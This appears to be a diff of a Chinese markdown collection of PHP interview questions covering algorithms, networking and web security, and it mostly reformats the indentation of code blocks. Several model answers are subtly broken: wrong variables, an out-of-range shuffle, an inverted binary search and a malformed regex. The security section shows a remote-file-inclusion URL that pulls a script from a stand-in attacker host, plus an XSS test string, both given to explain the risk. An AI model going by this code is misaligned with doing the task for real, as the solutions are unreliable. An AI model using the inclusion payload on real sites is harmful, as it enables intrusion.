@@ -7,99 +7,99 @@
 #### 1.反转函数的实现
 
 ```php
-    <?php
-    /**
-     * 反转数组
-     * @param  array $arr 
-     * @return array
-     */
-    function reverse($arr)
-    {
-        $n = count($arr);
-    
-        $left = 0;
-        $right = $n - 1;
-    
-        while ($left < $right) {
-            $temp = $arr[$left];
-            $arr[$left++] = $arr[$right];
-            $arr[$right--] = $temp;
-        }
-    
-        return $arr;
+<?php
+/**
+ * 反转数组
+ * @param  array $arr 
+ * @return array
+ */
+function reverse($arr)
+{
+    $n = count($arr);
+
+    $left = 0;
+    $right = $n - 1;
+
+    while ($left < $right) {
+        $temp = $arr[$left];
+        $arr[$left++] = $arr[$right];
+        $arr[$right--] = $temp;
     }
+
+    return $arr;
+}
 ```
 
 #### 2.两个有序int集合是否有相同元素的最优算法
 
 ```php
-    <?php
-    /**
-     * 寻找两个数组里相同的元素
-     * @param  array $arr1 
-     * @param  array $arr2 
-     * @return array      
-     */
-    function find_common($arr1, $arr2)
-    {
-        $common = array();
-        $i = $j = 0;
-        $count1 = count($arr1);
-        $count2 = count($arr2);
-        while ($i < $count1 && $j < $count2) {
-            if ($arr1[$i] < $arr2[$j]) {
-                $i++;
-            } elseif ($arr1[$i] > $arr2[$j]) {
-                $j++;
-            } else {
-                $common[] = $arr[$i];
-                $i++;
-                $j++;
-            }
+<?php
+/**
+ * 寻找两个数组里相同的元素
+ * @param  array $arr1 
+ * @param  array $arr2 
+ * @return array      
+ */
+function find_common($arr1, $arr2)
+{
+    $common = array();
+    $i = $j = 0;
+    $count1 = count($arr1);
+    $count2 = count($arr2);
+    while ($i < $count1 && $j < $count2) {
+        if ($arr1[$i] < $arr2[$j]) {
+            $i++;
+        } elseif ($arr1[$i] > $arr2[$j]) {
+            $j++;
+        } else {
+            $common[] = $arr[$i];
+            $i++;
+            $j++;
         }
-        return array_unique($common);
     }
+    return array_unique($common);
+}
 ```
 
 #### 3.将一个数组中的元素随机（打乱）
 
 ```php
-    <?php
-    /**
-     * 打乱数组
-     * @param  array $arr 
-     * @return array      
-     */
-    function custom_shuffle($arr)
-    {
-        $n = count($arr);
-        for ($i = 0; $i < $n; $i++) {
-            $rand_pos = mt_rand(0, $n);
-            if ($rand_pos != $i) {
-                $temp = $arr[$i];
-                $arr[$i] = $arr[$rand_pos];
-                $arr[$rand_pos] = $temp;
-            }
+<?php
+/**
+ * 打乱数组
+ * @param  array $arr 
+ * @return array      
+ */
+function custom_shuffle($arr)
+{
+    $n = count($arr);
+    for ($i = 0; $i < $n; $i++) {
+        $rand_pos = mt_rand(0, $n);
+        if ($rand_pos != $i) {
+            $temp = $arr[$i];
+            $arr[$i] = $arr[$rand_pos];
+            $arr[$rand_pos] = $temp;
         }
-        return $arr;
     }
+    return $arr;
+}
 ```
 
 #### 4.给一个有数字和字母的字符串，让连着的数字和字母对应
 
 ```php
-    <?php
-    function number_alphabet($str)
-    {
-        $number = preg_split('/[a-z]+/', $str, -1, PREG_SPLIT_NO_EMPTY);
-        $alphabet = preg_split('/\d+/', $str, -1, PREG_SPLIT_NO_EMPTY);
-        $n = count($number);
-        for ($i = 0; $i < $count; $i++) { 
-            echo $number[$i] . ':' . $alphabet[$i] . '</br>';
-        }
+<?php
+function number_alphabet($str)
+{
+    $number = preg_split('/[a-z]+/', $str, -1, PREG_SPLIT_NO_EMPTY);
+    $alphabet = preg_split('/\d+/', $str, -1, PREG_SPLIT_NO_EMPTY);
+    $n = count($number);
+    for ($i = 0; $i < $count; $i++) { 
+        echo $number[$i] . ':' . $alphabet[$i] . '</br>';
     }
-    $str = '1a3bb44a2ac';
-    number_alphabet($str);//1:a 3:bb 44:a 2:ac
+}
+$str = '1a3bb44a2ac';
+number_alphabet($str);//1:a 3:bb 44:a 2:ac
 ```
 
 #### 5.求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）
@@ -109,34 +109,34 @@
 代码如下： 
 
 ```php
-    <?php
-    /**
-     * 求n内的质数
-     * @param int $n 
-     * @return array
-     */
-    function get_prime($n)
-    {
-        $prime = array(2);//2为质数
-    
-        for ($i = 3; $i <= $n; $i += 2) {//偶数不是质数，步长可以加大 
-            $sqrt = intval(sqrt($i));//求根号n
-    
-            for ($j = 3; $j <= $sqrt; $j += 2) {//i是奇数，当然不能被偶数整除，步长也可以加大。 
-                if ($i % $j == 0) {
-                    break;
-                }
-            }
-    
-            if ($j > $sqrt) {
-                array_push($prime, $i);
+<?php
+/**
+ * 求n内的质数
+ * @param int $n 
+ * @return array
+ */
+function get_prime($n)
+{
+    $prime = array(2);//2为质数
+
+    for ($i = 3; $i <= $n; $i += 2) {//偶数不是质数，步长可以加大 
+        $sqrt = intval(sqrt($i));//求根号n
+
+        for ($j = 3; $j <= $sqrt; $j += 2) {//i是奇数，当然不能被偶数整除，步长也可以加大。 
+            if ($i % $j == 0) {
+                break;
             }
         }
-    
-        return $prime;
+
+        if ($j > $sqrt) {
+            array_push($prime, $i);
+        }
     }
-    
-    print_r(getPrime(1000));
+
+    return $prime;
+}
+
+print_r(getPrime(1000));
 ```
 
 #### 6.约瑟夫环问题
@@ -144,30 +144,30 @@
 相关题目：一群猴子排成一圈，按1,2,…,n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数， 再数到第m只，在把它踢出去…，如此不停的进行下去， 直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入m、n, 输出最后那个大王的编号。
 
 ```php
-    <?php
-    /**
-     * 获取大王
-     * @param  int $n 
-     * @param  int $m 
-     * @return int  
-     */
-    function get_king_mokey($n, $m) 
-    {
-        $arr = range(1, $n);
-    
-        $i = 0;
-    
-        while (count($arr) > 1) {
-            $i++;
-            $survice = array_shift($arr);
-    
-            if ($i % $m != 0) {
-                array_push($arr, $survice);
-            }
+<?php
+/**
+ * 获取大王
+ * @param  int $n 
+ * @param  int $m 
+ * @return int  
+ */
+function get_king_mokey($n, $m) 
+{
+    $arr = range(1, $n);
+
+    $i = 0;
+
+    while (count($arr) > 1) {
+        $i++;
+        $survice = array_shift($arr);
+
+        if ($i % $m != 0) {
+            array_push($arr, $survice);
         }
-    
-        return $arr[0];
     }
+
+    return $arr[0];
+}
 ```
 
 #### 7.如何快速寻找一个数组里最小的1000个数
@@ -176,65 +176,65 @@
 代码如下：
 
 ```php
-    <?php
-    //寻找最小的k个数
-    //题目描述
-    //输入n个整数，输出其中最小的k个。
-    /**
-     * 获取最小的k个数
-     * @param  array $arr 
-     * @param  int $k   [description]
-     * @return array
-     */
-    function get_min_array($arr, $k)
-    {
-        $n = count($arr);
-    
-        $min_array = array();
-    
-        for ($i = 0; $i < $n; $i++) {
-            if ($i < $k) {
-                $min_array[$i] = $arr[$i];
-            } else {
-                if ($i == $k) {
-                    $max_pos = get_max_pos($min_array);
-                    $max = $min_array[$max_pos];
-                }
-    
-                if ($arr[$i] < $max) {
-                    $min_array[$max_pos] = $arr[$i];
-    
-                    $max_pos = get_max_pos($min_array);
-                    $max = $min_array[$max_pos];
-                }
+<?php
+//寻找最小的k个数
+//题目描述
+//输入n个整数，输出其中最小的k个。
+/**
+ * 获取最小的k个数
+ * @param  array $arr 
+ * @param  int $k   [description]
+ * @return array
+ */
+function get_min_array($arr, $k)
+{
+    $n = count($arr);
+
+    $min_array = array();
+
+    for ($i = 0; $i < $n; $i++) {
+        if ($i < $k) {
+            $min_array[$i] = $arr[$i];
+        } else {
+            if ($i == $k) {
+                $max_pos = get_max_pos($min_array);
+                $max = $min_array[$max_pos];
+            }
+
+            if ($arr[$i] < $max) {
+                $min_array[$max_pos] = $arr[$i];
+
+                $max_pos = get_max_pos($min_array);
+                $max = $min_array[$max_pos];
             }
         }
-    
-        return $min_array;
     }
-    
-    /**
-     * 获取最大的位置
-     * @param  array $arr 
-     * @return array
-     */
-    function get_max_pos($arr)
-    {
-        $pos = 0;
-        for ($i = 1; $i < count($arr); $i++) { 
-            if ($arr[$i] < $arr[$pos]) {
-                $pos = $i;
-            }
+
+    return $min_array;
+}
+
+/**
+ * 获取最大的位置
+ * @param  array $arr 
+ * @return array
+ */
+function get_max_pos($arr)
+{
+    $pos = 0;
+    for ($i = 1; $i < count($arr); $i++) { 
+        if ($arr[$i] < $arr[$pos]) {
+            $pos = $i;
         }
-    
-        return $pos;
     }
-    
-    $array = [1, 100, 20, 22, 33, 44, 55, 66, 23, 79, 18, 20, 11, 9, 129, 399, 145, 2469, 58];
-    
-    $min_array = get_min_array($array, 10);
-    
-    print_r($min_array);
+
+    return $pos;
+}
+
+$array = [1, 100, 20, 22, 33, 44, 55, 66, 23, 79, 18, 20, 11, 9, 129, 399, 145, 2469, 58];
+
+$min_array = get_min_array($array, 10);
+
+print_r($min_array);
 ```
 
 #### 8.如何在有序的数组中找到一个数的位置（二分查找）
@@ -242,32 +242,32 @@
 代码如下：
 
 ```php
-    <?php
-    /**
-     * 二分查找
-     * @param  array $array 数组
-     * @param  int $n 数组数量
-     * @param  int $value 要寻找的值
-     * @return int
-     */
-    function binary_search($array, $n, $value)
-    {
-        $left = 0;
-        $right = $n - 1;
-    
-        while ($left <= $right) {
-            $mid = intval(($left + $right) / 2);
-            if ($value > $mid) {
-                $right = $mid + 1;
-            } elseif ($value < $mid) {
-                $left = $mid - 1;
-            } else {
-                return $mid;
-            }
+<?php
+/**
+ * 二分查找
+ * @param  array $array 数组
+ * @param  int $n 数组数量
+ * @param  int $value 要寻找的值
+ * @return int
+ */
+function binary_search($array, $n, $value)
+{
+    $left = 0;
+    $right = $n - 1;
+
+    while ($left <= $right) {
+        $mid = intval(($left + $right) / 2);
+        if ($value > $mid) {
+            $right = $mid + 1;
+        } elseif ($value < $mid) {
+            $left = $mid - 1;
+        } else {
+            return $mid;
         }
-    
-        return -1;
     }
+
+    return -1;
+}
 ```
 
 #### 9.给定一个有序整数序列，找出绝对值最小的元素
@@ -275,53 +275,53 @@
 思路：二分查找
 
 ```php
-    <?php
-    /**
-     * 获取绝对值最小的元素
-     * @param  array $arr
-     * @return int  
-     */
-    function get_min_abs_value($arr)
-    {
-        //如果符号相同，直接返回
-        if (is_same_sign($arr[0], $arr[$n - 1])) {
-            return $arr[0] >= 0 ? $arr[0] : $arr[$n - 1];
-        }
-    
-        //二分查找
-        $n = count($arr);
-        $left = 0;
-        $right = $n - 1;
-    
-        while ($left <= $right) {
-            if ($left + 1 === $right) {
-                return abs($arr[$left]) < abs($arr[$right]) ? $arr[$left] : $arr[$right];
-            }
-    
-            $mid = intval(($left + $right) / 2);
-    
-            if ($arr[$mid] < 0) {
-                $left = $mid + 1;
-            } else {
-                $right = $mid - 1;
-            }
-        }
+<?php
+/**
+ * 获取绝对值最小的元素
+ * @param  array $arr
+ * @return int  
+ */
+function get_min_abs_value($arr)
+{
+    //如果符号相同，直接返回
+    if (is_same_sign($arr[0], $arr[$n - 1])) {
+        return $arr[0] >= 0 ? $arr[0] : $arr[$n - 1];
     }
-    
-    /**
-     * 判断符号是否相同
-     * @param  int  $a 
-     * @param  int  $b 
-     * @return boolean  
-     */
-    function is_same_sign($a, $b)
-    {
-        if ($a * $b > 0) {
-            return true;
+
+    //二分查找
+    $n = count($arr);
+    $left = 0;
+    $right = $n - 1;
+
+    while ($left <= $right) {
+        if ($left + 1 === $right) {
+            return abs($arr[$left]) < abs($arr[$right]) ? $arr[$left] : $arr[$right];
+        }
+
+        $mid = intval(($left + $right) / 2);
+
+        if ($arr[$mid] < 0) {
+            $left = $mid + 1;
         } else {
-            return false;
+            $right = $mid - 1;
         }
     }
+}
+
+/**
+ * 判断符号是否相同
+ * @param  int  $a 
+ * @param  int  $b 
+ * @return boolean  
+ */
+function is_same_sign($a, $b)
+{
+    if ($a * $b > 0) {
+        return true;
+    } else {
+        return false;
+    }
+}
 ```
 
 #### 10.找出有序数组中随机3个数和为0的所有情况
@@ -329,41 +329,41 @@
 思路：动态规划
 
 ```php
-    <?php
-    function three_sum($arr)
-    {
-        $n = count($arr);
-    
-        $return = array();
-    
-        for ($i=0; $i < $n; $i++) { 
-            $left = $i + 1;
-            $right = $n - 1;
-    
-            while ($left <= $right) {
-                $sum = $arr[$i] + $arr[$left] + $arr[$right];
-    
-                if ($sum < 0) {
-                    $left++;
-                } elseif ($sum > 0) {
-                    $right--;
-                } else {
-                    $numbers = $arr[$i] . ',' . $arr[$left] . ',' . $arr[$right];
-                    if (!in_array($numbers, $return)) {
-                        $return[] = $numbers;
-                    }
-    
-                    $left++;
-                    $right--;
+<?php
+function three_sum($arr)
+{
+    $n = count($arr);
+
+    $return = array();
+
+    for ($i=0; $i < $n; $i++) { 
+        $left = $i + 1;
+        $right = $n - 1;
+
+        while ($left <= $right) {
+            $sum = $arr[$i] + $arr[$left] + $arr[$right];
+
+            if ($sum < 0) {
+                $left++;
+            } elseif ($sum > 0) {
+                $right--;
+            } else {
+                $numbers = $arr[$i] . ',' . $arr[$left] . ',' . $arr[$right];
+                if (!in_array($numbers, $return)) {
+                    $return[] = $numbers;
                 }
+
+                $left++;
+                $right--;
             }
         }
-    
-        return $return;
     }
-    
-    $arr = [-10, -9, -8, -4, -2, 0, 1, 2, 3, 4, 5, 6, 9];
-    var_dump(three_sum($arr));
+
+    return $return;
+}
+
+$arr = [-10, -9, -8, -4, -2, 0, 1, 2, 3, 4, 5, 6, 9];
+var_dump(three_sum($arr));
 ```
 
 #### 11.编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。
@@ -371,33 +371,33 @@
 思路：动态规划
 
 ```php
-    <?php
-    /**
-     * 获取最大的连续和
-     * @param  array $arr 
-     * @return int 
-     */
-    function max_sum_array($arr)
-    {
-        $currSum = 0;
-        $maxSum = 0;//数组元素全为负的情况，返回最大数
-    
-        $n = count($arr);
-    
-        for ($i = 0; $i < $n; $i++) { 
-            if ($currSum >= 0) {
-                $currSum += $arr[$j];
-            } else {
-                $currSum = $arr[$j];
-            }
+<?php
+/**
+ * 获取最大的连续和
+ * @param  array $arr 
+ * @return int 
+ */
+function max_sum_array($arr)
+{
+    $currSum = 0;
+    $maxSum = 0;//数组元素全为负的情况，返回最大数
+
+    $n = count($arr);
+
+    for ($i = 0; $i < $n; $i++) { 
+        if ($currSum >= 0) {
+            $currSum += $arr[$j];
+        } else {
+            $currSum = $arr[$j];
         }
-    
-        if ($currSum > $maxSum) {
-            $maxSum = $currSum;
-        }
-    
-        return $maxSum;
     }
+
+    if ($currSum > $maxSum) {
+        $maxSum = $currSum;
+    }
+
+    return $maxSum;
+}
 ```
 
 ### 计算机网络
@@ -417,7 +417,7 @@
 
 #### 2.为什么Tcp连接是三次，挥手是四次
 
-在Tcp连接中，服务端的SYN和ACK向客户端发送是一次性发送的，而在断开连接的过程中，B端向A端发送的ACK和FIN是分两次发送的。因为在B端接收到A端的FIN后，B端可能还有数据要传输，所以先发送ACK，等B端处理完自己的事情后就可以发送FIN断开连接了。
+在Tcp连接中，服务端的`SYN`和`ACK`向客户端发送是一次性发送的，而在断开连接的过程中，B端向A端发送的`ACK`和`FIN`是分`两次`发送的。因为在B端接收到A端的FIN后，B端可能还有数据要传输，所以先发送ACK，等B端处理完自己的事情后就可以发送FIN断开连接了。
 
 #### 3.Cookie存在哪
 
@@ -552,35 +552,35 @@ ArrayAccess（数组式访问）接口
 #### 5.用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。
 
 ```php
-    <?php
-    function tail($file, $num)
-    {  
-        $fp = fopen($file,"r");  
-        $pos = -2;
-        $eof = "";  
-        $head = false;   //当总行数小于Num时，判断是否到第一行了  
-        $lines = array();  
-        while ($num > 0) {  
-            while($eof != PHP_EOL){  
-                if (fseek($fp, $pos, SEEK_END) == 0) {    //fseek成功返回0，失败返回-1  
-                    $eof = fgetc($fp);
-                    $pos--;  
-                } else {                            //当到达第一行，行首时，设置$pos失败  
-                    fseek($fp, 0, SEEK_SET);
-                    $head = true;                   //到达文件头部，开关打开  
-                    break;  
-                }  
+<?php
+function tail($file, $num)
+{  
+    $fp = fopen($file,"r");  
+    $pos = -2;
+    $eof = "";  
+    $head = false;   //当总行数小于Num时，判断是否到第一行了  
+    $lines = array();  
+    while ($num > 0) {  
+        while($eof != PHP_EOL){  
+            if (fseek($fp, $pos, SEEK_END) == 0) {    //fseek成功返回0，失败返回-1  
+                $eof = fgetc($fp);
+                $pos--;  
+            } else {                            //当到达第一行，行首时，设置$pos失败  
+                fseek($fp, 0, SEEK_SET);
+                $head = true;                   //到达文件头部，开关打开  
+                break;  
             }  
-            array_unshift($lines, str_replace(PHP_EOL, '', fgets($fp)));   
-            if ($head) {//这一句，只能放上一句后，因为到文件头后，把第一行读取出来再跳出整个循环  
-                break; 
-            }                 
-            $eof = "";  
-            $num--;  
         }  
-        fclose($fp);  
-        return $lines;  
+        array_unshift($lines, str_replace(PHP_EOL, '', fgets($fp)));   
+        if ($head) {//这一句，只能放上一句后，因为到文件头后，把第一行读取出来再跳出整个循环  
+            break; 
+        }                 
+        $eof = "";  
+        $num--;  
     }  
+    fclose($fp);  
+    return $lines;  
+}  
 ```
 
 #### 6.`$SERVER['SERVER_NAME']`和`$SERVER['HTTP_HOST']`的区别
@@ -597,12 +597,11 @@ ArrayAccess（数组式访问）接口
 1. 当服务器为非80端口时： `$_SERVER["HTTP_HOST"]` 会输出端口号，例如：coffeephp.com:8080 `$_SERVER["SERVER_NAME"]` 会直接输出ServerName值 因此在这种情况下，可以理解为：`$_SERVER['HTTP_HOST']` = `$_SERVER['SERVER_NAME']` : `$_SERVER['SERVER_PORT']`
 1. 当配置文件httpd.conf中的`ServerName`与HTTP/1.0请求的域名不一致时： httpd.conf配置如下： 
 
-```php
-    <?php
-    <virtualhost *>    
+```apache
+<virtualhost *>    
     ServerName jsyzchen.com    
     ServerAlias blog.jsyzchen.com    
-    </virtualhost>
+</virtualhost>
 ```
 
 客户端访问域名 blog.jsyzchen.com `$_SERVER["HTTP_HOST"]` 输出 blog.jsyzchen.com `$_SERVER["SERVER_NAME"]` 输出jsyzchen.com
@@ -662,17 +661,17 @@ mail() | 在安全模式下，第五个参数被屏蔽。
 #### 8.PHP解决多进程同时写一个文件的问题
 
 ```php 
-    <?php
-    function write($str)
-    {
-        $fp = fopen($file, 'a');
-        do {
-            usleep(100);
-        } while (!flock($fp, LOCK_EX));
-        fwrite($fp, $str . PHP_EOL);
-        flock($fp, LOCK_UN);
-        fclose($fp);
-    }
+<?php
+function write($str)
+{
+    $fp = fopen($file, 'a');
+    do {
+        usleep(100);
+    } while (!flock($fp, LOCK_EX));
+    fwrite($fp, $str . PHP_EOL);
+    flock($fp, LOCK_UN);
+    fclose($fp);
+}
 ```
 
 #### 9.PHP里的超全局变量
@@ -704,7 +703,7 @@ mail() | 在安全模式下，第五个参数被屏蔽。
 * 字符串解析成桉树改为宏展开
 * 使用大块连续内存代替小块破碎内存 详细的可以参考鸟哥的PPT：[PHP7性能之源][49]
 
-#### 12.include($_GET['p'])的安全隐患
+#### 12.`include($_GET['p'])`的安全隐患
 
 现在任一个黑客现在都可以用:http://www.yourdomain.com/index.php?p=anyfile.txt 来获取你的机密信息，或执行一个PHP脚本。 如果allow_url_fopen=On，你更是死定了： 试试这个输入：http://www.yourdomain.com/index.php?p=http://youaredoomed.com/phphack.php 现在你的网页中包含了http://www.youaredoomed.com/phphack.php的输出. 黑客可以发送垃圾邮件，改变密码，删除文件等等。只要你能想得到。
 
@@ -712,11 +711,11 @@ mail() | 在安全模式下，第五个参数被屏蔽。
 
 SQL注入：
 
-* addslashes函数
-* mysql_real_escape_string/mysqli_real_escape_string/PDO::quote()
-* PDO预处理 XSS：htmlspecial函数 CSRF：
+* `addslashes`函数
+* `mysql_real_escape_string`/`mysqli_real_escape_string`/`PDO::quote()`
+* **PDO预处理 XSS**：htmlspecial函数 CSRF：
 * 验证HTTP REFER
-* 使用toke进行验证
+* 使用token进行验证
 
 #### 14.接口如何安全访问
 
@@ -735,36 +734,36 @@ jwt或验证签名
 #### 16.验证ip是否正确
 
 ```php
-    <?php
-    function check_ip($ip)
-    {
-        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
-        return false;
-        } else {
-            return true;
-        }
+<?php
+function check_ip($ip)
+{
+    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+    return false;
+    } else {
+        return true;
     }
+}
 ```
 
 #### 17.验证日期是否合理
 
 ```php
-    <?php
-    function check_datetime($datetime)
-    {
-        if (date('Y-m-d H:i:s', strtotime($datetime)) === $datetime) {
-            return true;
-        } else {
-            return false;
-        }
+<?php
+function check_datetime($datetime)
+{
+    if (date('Y-m-d H:i:s', strtotime($datetime)) === $datetime) {
+        return true;
+    } else {
+        return false;
     }
+}
 ```
 
 #### 18.写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）
 
 
 ```php
-    <?php
+<?php
 $text = '<script>alert('XSS')</script>';
 $pattern = '<script.*>.*<\/script>/i';
 $text = preg_replace($pattern, '', $text);
@@ -780,43 +779,43 @@ $text = preg_replace($pattern, '', $text);
 思路：用redis的队列
 
 ```php
-    <?php
-    $redis_key = 'seckill';//记录中奖记录
-    $uid = $GET['uid'];
-    $count = 10;//奖品的数量
-    if ($redis->lLen($redis_key) < 10) {
-        $redis->rPush($redis_key, $uid . '_' . microtime());
-        echo "秒杀成功";
-    } else {
-        echo "秒杀已结束";
-    }
+<?php
+$redis_key = 'seckill';//记录中奖记录
+$uid = $GET['uid'];
+$count = 10;//奖品的数量
+if ($redis->lLen($redis_key) < 10) {
+    $redis->rPush($redis_key, $uid . '_' . microtime());
+    echo "秒杀成功";
+} else {
+    echo "秒杀已结束";
+}
 ```
 
 #### 21.请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高
 
 ```php
-    <?php
-    //ip2long，把所有城市的最小和最大Ip录进去
+<?php
+//ip2long，把所有城市的最小和最大Ip录进去
+$redis_key = 'ip';
+$redis->zAdd($redis_key, 20, '#bj');//北京的最小IP加#
+$resid->zAdd($redis_key, 30, 'bj');//最大IP
+
+function get_ip_city($ip_address)
+{
+    $ip = ip2long($ip_address);
+
     $redis_key = 'ip';
-    $redis->zAdd($redis_key, 20, '#bj');//北京的最小IP加#
-    $resid->zAdd($redis_key, 30, 'bj');//最大IP
-    
-    function get_ip_city($ip_address)
-    {
-        $ip = ip2long($ip_address);
-    
-        $redis_key = 'ip';
-        $city = zRangeByScore($redis_key, $ip, '+inf', array('limit' => array(0, 1)));
-        if ($city) {
-            if (strpos($city[0], "#") === 0) {
-                echo '城市不存在!';
-            } else {
-                echo '城市是' . $city[0];
-            }
-        } else {
+    $city = zRangeByScore($redis_key, $ip, '+inf', array('limit' => array(0, 1)));
+    if ($city) {
+        if (strpos($city[0], "#") === 0) {
             echo '城市不存在!';
+        } else {
+            echo '城市是' . $city[0];
         }
+    } else {
+        echo '城市不存在!';
     }
+}
 ```
 
 ### 其他
